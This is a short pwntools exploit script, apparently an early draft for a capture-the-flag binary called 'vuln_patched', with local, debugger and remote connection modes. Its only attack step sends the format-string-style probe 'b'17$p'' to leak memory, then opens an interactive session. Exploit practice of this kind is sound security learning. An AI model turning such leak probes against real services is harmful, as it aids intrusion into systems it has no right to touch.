#!/usr/bin/env python3

from pwn import *

TARGET = './vuln_patched'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  # context.terminal = ['tmux', 'splitw', '-h']  
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# EPXLOIT

p.sendline(b'17$p')

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

# pause()

p.interactive()

# NOTE:
#
